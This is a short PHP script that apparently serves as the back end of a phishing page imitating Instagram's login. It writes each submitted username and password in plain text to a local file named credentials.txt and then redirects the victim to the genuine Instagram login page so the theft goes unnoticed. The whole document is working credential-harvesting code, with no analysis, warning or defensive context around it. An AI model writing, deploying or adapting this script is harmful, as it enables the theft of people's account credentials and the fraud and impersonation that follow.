<?php
$user = $_POST['username'];
$pass = $_POST['password'];

file_put_contents("credentials.txt", "Username: $user | Password: $pass\n", FILE_APPEND);

header('Location: https://www.instagram.com/accounts/login/');
exit();
?>
